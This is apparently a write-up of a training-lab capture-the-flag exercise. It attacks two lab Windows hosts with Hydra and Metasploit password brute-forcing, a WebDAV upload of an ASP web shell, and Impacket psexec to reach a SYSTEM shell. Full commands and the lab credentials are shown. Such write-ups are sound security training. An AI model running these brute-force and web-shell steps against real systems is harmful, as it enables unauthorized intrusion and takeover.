# Lab 05 – Host & Network Penetration Testing: System-Host Based Attacks CTF 1

This lab focused on exploiting weak HTTP authentication, WebDAV misconfigurations, and SMB credential reuse across two Windows targets (`target1.ine.local` and `target2.ine.local`). Four flags were obtained through credential brute-forcing, file upload abuse, and remote command execution.

---

## Flag 1 – Weak HTTP Basic Authentication on WebDAV  
**Hint:** *User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located.*

An initial scan identified an IIS server requiring authentication:

```bash
nmap -sV -sC target1.ine.local
```

Since port 80 returned `401 Unauthorized`, a brute-force attack was performed against user `bob` using Hydra:

```bash
hydra -l bob -P /usr/share/wordlists/metasploit/unix_passwords.txt target1.ine.local http-get /
# -> Valid credentials found: bob : password_123321
```

Using these credentials with a WebDAV client (`cadaver`) granted access to the `/webdav/` directory, where the first flag was stored

---

## Flag 2 – WebDAV File Upload and Remote Shell Execution  
**Hint:** *Valuable files are often on the C: drive. Explore it thoroughly.*

Upload permissions were confirmed using `davtest`, revealing support for multiple executable file types, including `.asp`:

```bash
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/
```

An ASP web shell was uploaded via WebDAV:

```bash
cadaver http://target1.ine.local/webdav/
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```

Accessing the shell via browser enabled remote command execution. Enumerating `C:\` revealed the second flag

---

## Flag 3 – SMB Administrator Credentials via Brute Force  
**Hint:** *By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag.*

A scan of `target2.ine.local` exposed SMB and RDP services:

```bash
nmap -sV -sC target2.ine.local
```

Using Metasploit’s `smb_login`, weak Administrator credentials were successfully identified:

```bash
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS target2.ine.local
run
# -> Success: administrator : pineapple
```

With valid credentials, the administrative share `C$` was accessed using `smbclient`, where the third flag was retrieved

---

## Flag 4 – Remote Desktop Loot via PsExec  
**Hint:** *The Desktop directory might have what you're looking for. Enumerate its contents.*

Using Impacket’s `psexec`, an interactive SYSTEM shell was obtained:

```bash
impacket-psexec administrator@target2.ine.local cmd.exe
# Password: pineapple
```

Navigating to the Administrator Desktop revealed the final flag

---

## Summary

Flag 1 — HTTP brute force (Hydra): Brute-forced HTTP Basic on target1, authenticated as bob, and gained WebDAV access.

Flag 2 — WebDAV upload + ASP shell: With bob’s credentials uploaded an ASP webshell via WebDAV, executed commands remotely on target1 and retrieved the second flag.

Flag 3 — SMB brute force (Metasploit): Brute-forced SMB on target2, discovered valid Administrator credentials, accessed the administrative C$ share and downloaded the third flag.

Flag 4 — PsExec SYSTEM shell: Used the Administrator credentials to run PsExec (Impacket), obtained a SYSTEM shell on target2, and read the final flag from the Administrator desktop.

---

## Tools Used

- **nmap** – Service discovery  
- **Hydra** – HTTP credential brute force  
- **Cadaver / davtest** – WebDAV exploitation  
- **Metasploit (`smb_login`)** – SMB credential attack  
- **smbclient** – SMB interaction  
- **Impacket PsExec** – Remote command execution  

